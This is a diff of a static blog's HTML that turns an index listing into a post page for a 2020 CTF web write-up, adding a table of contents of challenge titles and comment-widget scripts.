-      <a class="article-more-a" href="/blog/2020/05/25/2020YCTF-web-WP/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-WP"><span class="toc-number">1.</span> <span class="toc-text">web WP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-google"><span class="toc-number">2.</span> <span class="toc-text">fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#假猪套天下第一"><span class="toc-number">3.</span> <span class="toc-text">假猪套天下第一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单注入"><span class="toc-number">4.</span> <span class="toc-text">简单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss之光"><span class="toc-number">5.</span> <span class="toc-text">xss之光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Schrödinger"><span class="toc-number">6.</span> <span class="toc-text">Schrödinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#elementmaster"><span class="toc-number">7.</span> <span class="toc-text">elementmaster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件探测"><span class="toc-number">8.</span> <span class="toc-text">文件探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyAspDotNet"><span class="toc-number">9.</span> <span class="toc-text">EasyAspDotNet</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
 
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/blog/2020/05/25/hello-world/" target="_blank">welcome!</a>
-  
-    </h1>
-  
+
+<div id="SOHUCS" sid="BJDCTF2nd-web-WP" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "ture",
+        conf: "ture"
+    });
+</script>
+</script>
 
 
-  
-  
-<a href="/blog/2020/05/25/hello-world/" class="archive-article-date">
-        <time datetime="2020-05-25T08:10:05.557Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-25</time>
-</a>
 
-  
-  
-    
+<section id="comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname =
+    'true'; // required: replace example with your forum shortname
 
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    
-    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
 
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/blog/2020/05/25/hello-world/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by
+      Disqus.</a></noscript>
+</section>
 
 
 
 
-  
-  
+
+
 
 
           </div>
@@ -514,8 +610,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: ture,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
